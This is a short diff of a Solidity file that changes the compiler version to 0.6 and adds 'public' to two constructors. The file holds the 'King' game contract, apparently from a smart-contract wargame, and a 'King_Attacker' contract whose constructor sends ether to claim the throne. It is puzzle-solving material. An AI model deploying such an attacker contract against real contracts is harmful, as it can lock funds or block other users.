@@ -1,12 +1,12 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.6.0;
 
 contract King {
     address king;
     uint public prize;
     address public owner;
 
-    constructor() payable {
+    constructor() public payable {
         owner = msg.sender;
         king = msg.sender;
         prize = msg.value;
@@ -25,7 +25,7 @@ contract King {
 }
 
 contract King_Attacker {
-    constructor(address payable _kingContractAddress) payable {
+    constructor(address payable _kingContractAddress) public payable {
         (bool success, ) = _kingContractAddress.call{value: msg.value}("");
         require(success);
     }
